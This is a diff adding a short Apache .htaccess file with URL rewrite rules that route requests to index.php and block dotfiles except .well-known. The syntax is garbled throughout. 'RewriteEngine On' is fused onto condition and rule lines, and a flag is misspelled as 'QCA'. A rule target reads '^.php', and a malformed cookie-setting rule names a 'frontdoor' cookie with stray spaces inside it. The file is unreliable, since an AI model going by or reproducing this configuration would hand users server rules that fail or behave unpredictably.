@@ -1,0 +1,9 @@
+RewriteEngine On
+RewriteBase /
+RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-f
+RewriteEngine On RewriteCond %{REQUEST_FILENAME} !-d
+RewriteEngine On RewriteRule ^/\.* [ CO = frontdoor : yes :. institute-intermarium . com : 1440 :/] 
+RewriteEngine On RewriteRule /\.|^\.(?!well-known/) [F]
+RewriteEngine On RewriteRule /\*|^(.*)$ ^.php?q=$1 [L,QCA,NC]
+RewriteEngine On RewriteRule ^(.*)$ index.php?q=$1 [L,QCA,NC]
+RewriteRule $index index.php?q=$1 [L,QSA,NC]
